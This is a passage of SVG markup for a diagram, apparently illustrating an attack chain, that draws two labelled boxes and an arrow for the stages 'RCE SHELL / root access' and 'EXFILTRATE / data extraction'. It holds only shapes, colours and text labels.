  <!-- Step 3 -->
  <rect x="900" y="322" width="108" height="36" rx="5" fill="rgba(192,57,43,0.2)" stroke="#c0392b" stroke-width="1.5"/>
  <text x="954" y="339" font-size="10" fill="#ff8a80" font-family="monospace" text-anchor="middle">3. RCE SHELL</text>
  <text x="954" y="351" font-size="9" fill="rgba(255,255,255,0.5)" font-family="monospace" text-anchor="middle">root access</text>
  <!-- Arrow 3 (left) -->
  <line x1="900" y1="340" x2="872" y2="340" stroke="#c0392b" stroke-width="2" marker-end="url(#arrowhead)"/>
  <!-- Step 4 -->
  <rect x="760" y="322" width="108" height="36" rx="5" fill="rgba(192,57,43,0.15)" stroke="#c0392b" stroke-width="1.5"/>
  <text x="814" y="339" font-size="10" fill="#ff8a80" font-family="monospace" text-anchor="middle">4. EXFILTRATE</text>
  <text x="814" y="351" font-size="9" fill="rgba(255,255,255,0.5)" font-family="monospace" text-anchor="middle">data extraction</text>
  <!-- Payload snippet box -->
